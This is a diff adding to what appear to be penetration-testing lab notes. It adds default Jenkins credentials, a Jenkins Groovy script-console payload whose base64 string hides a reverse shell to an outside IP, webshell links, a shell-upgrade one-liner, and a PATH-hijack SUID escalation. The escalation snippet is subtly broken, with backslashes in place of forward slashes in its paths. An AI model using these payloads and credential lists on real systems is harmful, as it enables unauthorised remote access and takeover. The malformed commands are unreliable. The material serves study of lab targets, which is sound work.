@@ -18,10 +18,12 @@ $ ftp <ip>
 ### SMB (445)
 
 ```bash 
-$ smbclient -L \\\\<ip>\\
+$ smbclient -L \\\\<ip>\\ -U Admin
 $ smbclient \\\\<ip>\\<dir>
 // Get - download file
 ```
+
+$ at the end means that is an administrative share.
 
 ### RDP (3389)
 
@@ -130,4 +132,73 @@ admin password123
 admin qwerty123
 admin administrator123
 admin changeme123
+```
+
+### Jenkins default credentials
+
+```
+admin:password
+admin:admin
+root:root
+root:password
+admin:admin1
+admin:password1
+root:password1
+```
+
+### How to pwn Jenkins
+
+https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution 
+https://github.com/gquere/pwn_jenkins 
+
+Script console allow to type in an arbitrary Groovy script and execute it on the server. 
+
+Script console access - http://jenkins_ip/script
+
+Easy code execution via script console - apply specific command in base64:
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,c2ggLWkgPiYgL2Rldi91ZHAvMTAuMTAuMTUuMTA4LzkwMDEgMD4mMQ==}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
+## Tier 2
+
+### Web exploitation
+
+Webshells - https://github.com/BlackArch/webshells 
+
+Running terminal session via webshell
+
+```
+python3 -c'import pty;pty.spawn("/bin/bash")'
+```
+
+### Basic checking user privileges
+
+```
+find / -group bugtracker 2>/dev/null
+sudo -l
+id
+```
+
+### Checking file info
+
+```
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+```
+
+### SUID exploitation
+
+Run program, check the path of the command, try to switch usage of command to shell by adding modified executable with PATH to use by scripts:
+
+```
+cd \tmp\
+echo "\bin\sh" > cat
+chmod +x cat
+export PATH=/tmp:$PATH
+echo $PATH
+
+//run executable from tmp 
 ```
